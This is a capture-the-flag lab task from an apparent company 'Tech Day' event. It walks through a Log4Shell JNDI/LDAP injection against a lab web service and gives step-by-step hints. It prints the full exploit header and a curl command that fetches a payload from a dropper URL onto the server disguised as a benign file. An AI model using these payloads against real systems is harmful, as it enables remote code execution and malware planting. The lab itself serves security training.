# C1 - File Storage Security - Task 5: Drop It Like It‚Äôs Hot üî•

## DESCRIPTION

Now that you‚Äôve set up the malicious server, time to run the exploit.

To do this, you have to make a request to http://sudosingles-optimizer. But you‚Äôre going to include a specially crafted header to call back to your malicious LDAP server and execute a command.

For this challenge, the command you want to execute inside the sudosingles-optimizer container will reach out to a malicious URL and drop a scary payload onto the filesystem‚Äîa payload which will execute whenever a user visits the website.

## DETAILS

The malicious command you want to execute is:

curl PAYLOADDROPPERURL --output /srv/connectioncheck

Where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below.

FSSPayloadDropperUrl is a special URL that can be used to drop a ransomware payload. When the above command executes in the container running sudosingles-optimizer, it will drop a nasty file in the /srv directory, disguised as something benign.

Just like before, you‚Äôll make a request to your malicious LDAP server using curl on the attack machine. Open another Terminal Emulator window and run the following command:

curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'

Where PAYLOAD is the malicious command that we crafted above and YOURIP is the attack machine‚Äôs private IP.

However, you‚Äôll notice that if you just try to substitute the malicious command for PAYLOAD, then run the whole request to sudosingles-optimizer above, the exploit won‚Äôt work. Something is missing‚Ä¶

Maybe you need to encode PAYLOAD somehow? Hm‚Ä¶

When you believe you‚Äôve successfully performed the exploit, click ‚ÄúVerify‚Äù to check your work.

## NOTES

No actual ransomware is used in this challenge, so don‚Äôt worry. We‚Äôre just having fun here on Tech Day.

## HINTS

### HINT 1

/Basic/Command/Base64 might be a hint! And the challenge said to "encode"‚Ä¶ hmm‚Ä¶‚Ä¶

### HINT 2

You need to encode the malicious command as base64, and add it to the ldap URL. For example: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/BASE_64_ENCODED_COMMAND}. If that isn‚Äôt working for you, triple-check to make sure that you have encoded the malicious command correctly.

### HINT 3

1. Craft the malicious command: curl PAYLOADDROPPERURL --output /srv/connectioncheck
2. Encode it as base64 using any tool. Base64encode.org is a great option.
3. Replace it in the command: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'
4. Execute
